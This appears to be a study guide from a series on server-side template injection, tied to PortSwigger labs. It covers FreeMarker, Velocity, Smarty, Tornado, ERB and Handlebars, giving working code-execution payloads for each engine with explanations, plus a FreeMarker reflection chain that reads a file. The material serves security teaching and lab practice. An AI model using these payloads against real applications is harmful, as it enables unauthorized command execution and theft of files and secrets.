# 04 — Other Template Engines: FreeMarker, Velocity, Smarty, Tornado, ERB, Handlebars

This file covers the engines you need to *recognize and exploit* but encounter less frequently than
Jinja2 or Twig. Each section follows the same format: syntax, confirmation payload, and a fully broken-down
RCE/exploitation chain.

## 1. FreeMarker (Java)

### 1.1 Syntax and Confirmation

FreeMarker uses `${ ... }` for expressions and `<# ... >` for directives (assignments, loops, etc.).

```
${7*7}
```
Renders `49`, confirming expression evaluation in a JVM `${ }`-style engine.

### 1.2 RCE via `freemarker.template.utility.Execute`

```
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("id") }
```

Breaking this down:

- `<#assign ex = ... >` — FreeMarker's assignment directive, binding the result of the right-hand
  expression to a new template variable named `ex`. This is FreeMarker's equivalent of a `let`/`var`
  statement.
- `"freemarker.template.utility.Execute"` — the fully-qualified Java class name, given as a plain string.
- `?new()` — this is the dangerous part. `new` is a FreeMarker **built-in** (a special postfix operator,
  written with `?`) that takes a string containing a class name and **instantiates that class**,
  provided the class implements FreeMarker's `TemplateModel` interface. This is intended so template
  authors can reference small utility helper classes — but nothing stops you from naming *any* class on
  the classpath that happens to implement that interface, including ones with dangerous side effects.
- `freemarker.template.utility.Execute` — a real utility class shipped with FreeMarker itself, whose
  entire purpose is to run a string as an OS command via Java's `Runtime.exec()` and return the output.
  It is explicitly documented in FreeMarker's own security FAQ as dangerous if `new()` is reachable by
  untrusted input.
- `${ ex("id") }` — having stored an `Execute` instance in `ex`, you now call it like a function with the
  OS command `"id"` as its argument. `Execute` objects are callable in FreeMarker because they implement
  the `TemplateMethodModelEx` interface, which FreeMarker treats as "callable from template syntax."

### 1.3 Sandbox-bypass via Object Method Chaining (when `new()` is blocked)

When FreeMarker's `new()` built-in is disabled or restricted (a known, documented mitigation), the
fallback technique is to walk Java's reflection-adjacent object model starting from *any* object already
exposed in the template context — for example, a `product` object:

```
${product.getClass()}
```
- `.getClass()` — every Java object inherits this method from `java.lang.Object`. It returns a `Class`
  object representing the object's runtime type, confirming reflection-style access is reachable.

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

- `.getClass()` — get the runtime `Class` object for `product`, as above.
- `.getProtectionDomain()` — returns the `ProtectionDomain`, a Java security construct describing where
  this class's code was loaded from and what permissions it has.
- `.getCodeSource()` — from the protection domain, get the `CodeSource`, which describes the origin
  (JAR file or directory) the class's bytecode was loaded from.
- `.getLocation()` — returns that origin as a `URL` — effectively, a filesystem path to the application's
  own code, expressed as a URL object. This is the pivot point: it gives you a real `URL`/`URI` object you
  can now manipulate with normal path operations.
- `.toURI()` then `.resolve('/home/carlos/my_password.txt')` — `resolve()` is a standard `URI` method
  that combines a base URI with a relative or absolute path. By resolving an absolute path here, you
  redirect this URI away from the application's own code location and onto an arbitrary file path on
  disk.
- `.toURL().openStream()` — converts back to a `URL` and opens an `InputStream` reading the target file's
  raw bytes — this is the actual file-read primitive.
- `.readAllBytes()` — reads the entire stream into a byte array.
- `?join(" ")` — a FreeMarker built-in that joins a sequence (here, the byte array) into a
  space-separated string so it can actually be rendered as template output text.

**Why this matters:** this chain achieves arbitrary file *read* using nothing but methods every Java
object already exposes through standard reflection — no dangerous utility class or `new()` call required,
which is exactly why it works even when FreeMarker's documented `new()`-blocking mitigation is in place.

**Real-world note:** this exact chain corresponds to PortSwigger's **sandboxed environment** lab. The
underlying lesson — that "harmless" reflection methods (`getClass()`, `getProtectionDomain()`, etc.) can
be chained into a working file-read/RCE primitive — generalizes to any JVM-based template engine with a
similarly leaky sandbox, not just FreeMarker.

## 2. Apache Velocity (Java)

### 2.1 Syntax and Confirmation

Velocity uses `$variable` for output and `#directive` for control structures (`#if`, `#foreach`, `#set`).

```
#set($x=7*7)
$x
```
- `#set(...)` — Velocity's assignment directive.
- `$x` on its own line — referencing the variable triggers output of its value, `49`.

### 2.2 RCE Concept

Velocity templates that expose Java objects are vulnerable to the same reflection-chaining philosophy as
FreeMarker, since both ultimately run on the JVM and inherit the same `Object.getClass()` style methods.
A typical pattern:

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass().forName("java.lang.String")).invoke($e.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke($null),"id")
```

- `$e.getClass()` — same pivot as FreeMarker: get a `Class` object from any available object.
- `.forName("java.lang.Runtime")` — a static reflection method that loads an arbitrary class by its fully
  qualified name, given only as a string. This is the key primitive: it lets you reach `Runtime` (which
  exposes process-execution methods) even though no `Runtime` object was ever directly exposed to the
  template.
- `.getMethod("exec", ...)` — reflectively looks up the `exec` method on the `Runtime` class, matching it
  by name and parameter types.
- `.getMethod("getRuntime").invoke($null)` — `Runtime.getRuntime()` is the standard way to obtain the
  singleton `Runtime` instance; calling it via reflection with no target instance (`null`, since it's
  static) returns that singleton.
- `.invoke(..., "id")` — finally invokes `exec("id")` on the obtained `Runtime` instance, running the OS
  command.

**Real-world note:** Velocity is less common in modern stacks than it once was, but still appears in
legacy enterprise Java applications (older Struts/Spring integrations, internal reporting tools). The
reflection-chaining concept is identical across all JVM template engines — once you understand it for
FreeMarker, Velocity is the same idea with different surface syntax.

## 3. Smarty (PHP)

### 3.1 Syntax and Confirmation

Smarty uses `{ ... }` delimiters by default (configurable per-application, so confirm the actual
delimiters in use before assuming `{ }`).

```
{7*7}
```
Renders `49`.

### 3.2 RCE via `{php}` block or `system()`-equivalent functions

Older Smarty versions supported a literal `{php}...{/php}` block allowing raw PHP execution:

```
{php}echo `id`;{/php}
```
- `{php}` / `{/php}` — Smarty's (now-deprecated and removed in modern versions) block tag that tells the
  compiler "everything between these tags is raw PHP source, execute it directly, don't treat it as
  Smarty template syntax at all."
- `` `id` `` — PHP's backtick operator, syntactic sugar equivalent to calling `shell_exec("id")`.

In modern Smarty (where `{php}` has been removed), the equivalent path is invoking PHP functions directly
through Smarty's modifier/function syntax, if the application registers any modifier that wraps a
dangerous PHP function, or via `{self::...}` style calls depending on configuration. The general
principle: identify what raw PHP-calling primitives the specific Smarty version and app configuration
still exposes, since this varies significantly by version.

**Real-world note:** Smarty's own security model has tightened considerably over major versions
specifically *because* of `{php}` block abuse — if you find a target still supporting it, that's a strong
signal of an outdated, unpatched dependency.

## 4. Tornado (Python)

### 4.1 Syntax and Confirmation

Tornado templates use `{{ expression }}` for output and `{% statement %}` for control flow — visually
near-identical to Jinja2.

```
{{7*7}}
```
Renders `49` — same Python-string-repetition disambiguation rules from file `01`/`02` apply
(`{{7*'7'}}` → `7777777` confirms Python-backed engine).

### 4.2 RCE via `{% %}` statement block (full Python statements)

Tornado's `{% %}` block permits real Python statements, not just expressions — this is the key
difference from Jinja2's more restricted block tags, and it's what makes Tornado's exploitation path more
direct:

```
{% import os %}{{os.system('id')}}
```

- `{% import os %}` — Tornado allows raw Python `import` statements directly inside its statement block.
  This is intentionally more permissive than Jinja2, which doesn't support arbitrary `import` statements
  inside templates by default.
- `{{os.system('id')}}` — having imported the real `os` module into the template's execution scope,
  `os.system()` runs the given string as an OS command through the shell, with its return code (not its
  output) printed to the page. (To capture actual command *output* rather than just an exit code, prefer
  `os.popen('id').read()` in place of `os.system('id')`.)

**Real-world note:** this corresponds directly to PortSwigger's **basic SSTI (code context)** lab. The
`}}` break-out technique from file `01` section 3.2 is exactly how you reach this injection point in that
lab — you first escape an existing `{{user.name}}`-style expression with `}}`, then inject the `{% import
os %}{{os.system(...)}}` payload as fresh template syntax immediately after.

## 5. ERB (Ruby)

### 5.1 Syntax and Confirmation

ERB (Embedded Ruby) uses `<%= expression %>` to evaluate and print, and `<% statement %>` to execute
without printing.

```
<%= 7*7 %>
```
Renders `49`.

### 5.2 RCE via Ruby's `system()`

```
<%= system("id") %>
```
- `<%= ... %>` — evaluate-and-print delimiter.
- `system("id")` — a real Ruby `Kernel` method (available in virtually every Ruby execution context,
  including inside ERB templates with no special imports needed) that runs the given string as a shell
  command. It returns `true`/`false`/`nil` based on exit status, but — critically — the command's actual
  *output* is printed directly to the real stdout of the Ruby process, not captured into the ERB
  expression's return value. In a CTF/lab context where you have direct terminal/process access, this is
  enough to confirm execution; in a remote web context, prefer backtick syntax to capture output into the
  page itself:

```
<%= `id` %>
```
- Ruby's backtick operator runs the command via the shell **and returns its standard output as a
  string**, which ERB then prints directly into the rendered page — making this the better choice for
  blind/remote exploitation where you need to actually see the command's output in the HTTP response.

**Real-world note:** this is PortSwigger's **basic SSTI** lab (the very first lab in the track, plaintext
context). ERB's simplicity — no sandboxing, no object-graph gymnastics required, `system()`/backticks
available immediately — makes it the ideal first lab for understanding the detect → confirm → escalate
flow before tackling engines with sandboxes or reflection chains.

## 6. Handlebars (JavaScript / Node.js)

### 6.1 Syntax and Confirmation

Handlebars is deliberately a **"logic-less"** template engine — by design, it does not support inline
expressions like `{{7*7}}` evaluating arithmetic, and has no built-in mechanism for arbitrary code
execution. This is precisely why exploiting it requires a documented, publicly-researched exploit chain
rather than something you can derive from first principles the way you can with Jinja2 or Twig.

### 6.2 RCE via the Documented Prototype-Pollution-Style Chain

The well-known Handlebars SSTI RCE (originally published by security researcher @Zombiehelp54) abuses
Handlebars' `#with` and `#each` helpers to reach into JavaScript's prototype chain and ultimately invoke
Node.js's `child_process` module:

```
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}
    {{this.push (lookup string.sub "constructor")}}
    {{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}
      {{this.push "return require('child_process').exec('id');"}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (string.sub.apply 0 codelist)}}
          {{this}}
        {{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

High-level breakdown of what's actually happening (rather than a line-by-line trace, since this chain is
intentionally obfuscated by design):

- `{{#with "s" as |string|}}` — binds the string `"s"` to a local block variable named `string`, giving
  you a handle on a real JavaScript `String` instance to pivot from.
- The nested `{{#with split as |conslist|}}` and `.pop`/`.push` sequence — these manipulate Handlebars'
  internal helper-resolution array (`split`, here, refers to a Handlebars-internal helper list, not the
  JS `String.split` method directly) to swap out a known, safe entry for a *reference to the `Function`
  constructor*, obtained via `(lookup string.sub "constructor")`. `"".constructor.constructor` in plain
  JavaScript is the classic trick to reach the global `Function` constructor — this Handlebars chain is
  doing that same trick, just through Handlebars' helper/lookup syntax instead of raw JS, because
  Handlebars doesn't let you write raw JS expressions directly.
- The inner `string.split` manipulation with `.push "return require('child_process').exec('id');"` — once
  you have a handle that resolves to `Function`, pushing a string containing real JavaScript source code
  (`return require('child_process').exec('id');`) sets up that string as the *body* of a dynamically
  constructed function — exactly like calling `new Function("return require(...)...")` in plain
  JavaScript.
- The final `{{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}}` —
  this is where the dynamically constructed function is actually **invoked** (`.apply(...)`), running
  your injected JavaScript source, which calls Node's `child_process.exec('id')` to run the OS command.

**Why this is shown as "use the documented exploit" rather than derived step-by-step like Jinja2's chain:**
Handlebars' logic-less design means there is no clean, linear "object graph walk" the way there is for
Python or PHP-backed engines. The exploit instead abuses specific quirks of how Handlebars resolves
`this`, helper lookups, and block parameters — quirks that were discovered through dedicated research
into Handlebars' helper-resolution internals, not something you'd realistically rediscover live on an
engagement. The professional approach here is exactly what real pentesters do: search for "Handlebars
server-side template injection" and adapt a known, documented exploit to your specific command, rather
than attempting to derive a logic-less engine's RCE chain from scratch under time pressure.

**Real-world note:** this corresponds directly to PortSwigger's **unknown language with a documented
exploit** lab — the lab's entire teaching point is that real-world SSTI work sometimes legitimately means
finding and adapting someone else's published research, not always building a fresh exploit from
first principles. Knowing *when* to search for a documented exploit instead of reinventing one is itself
a professional skill.

## 7. Quick Engine Recognition Table

| Engine | Language | Expr. syntax | Statement syntax | Sandbox by default? |
|---|---|---|---|---|
| Jinja2 | Python | `{{ }}` | `{% %}` | No (unless `SandboxedEnvironment` used explicitly) |
| Twig | PHP | `{{ }}` | `{% %}` | No (unless `Sandbox` extension enabled explicitly) |
| FreeMarker | Java | `${ }` | `<# >` | Partial (some built-ins restrictable) |
| Velocity | Java | `$var` | `#directive` | No, by default |
| Smarty | PHP | `{ }` (configurable) | `{ }` | Increasingly restricted in modern versions |
| Tornado | Python | `{{ }}` | `{% %}` | No |
| ERB | Ruby | `<%= %>` | `<% %>` | No |
| Handlebars | JavaScript (Node.js) | `{{ }}` | `{{# }}` helpers | Logic-less by design (no arithmetic/exec without chain abuse) |
| Django Templates | Python | `{{ }}` | `{% %}` | Yes — heavily restricted, expression evaluation is limited; abuse path is usually info-disclosure via exposed objects (e.g., `settings`) rather than direct RCE |

For Django Templates specifically — see PortSwigger's **information disclosure via user-supplied
objects** lab, which targets the `{{settings.SECRET_KEY}}` disclosure path rather than code execution,
since Django's template language deliberately omits arbitrary attribute/method-call chaining for security
reasons. This is an important real-world lesson: not every SSTI finding escalates to RCE — sometimes the
realistic, fully exploitable impact ceiling is sensitive configuration/secret disclosure, and reporting it
accurately as such (rather than overclaiming RCE) is part of professional reporting.
